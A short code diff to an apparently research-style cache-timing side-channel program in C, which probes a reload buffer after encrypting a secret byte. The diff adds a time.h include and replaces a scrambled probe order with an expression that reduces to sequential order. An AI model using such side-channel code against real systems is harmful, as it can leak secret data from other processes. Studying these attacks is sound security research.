@@ -10,6 +10,7 @@
 #include <unistd.h>
 #include <ctype.h>
 #include <pthread.h>
+#include <time.h>
 
 #include "asm.h"
 #include "libcrypto/crypto.h"
@@ -83,7 +84,7 @@ int main(int argc, char *argv[]) {
             encrypt_secret_byte(reloadbuffer, STRIDE, (int)idx);
 
             for (int i = 0; i < 256; i++) {
-                int k = (i * 167 + 13) & 255;
+                uint64_t k = (i + 109883 * 256) & 255;
                 lfence();
                 cpuid();
                 uint64_t dt = time_access(reloadbuffer + k * STRIDE);
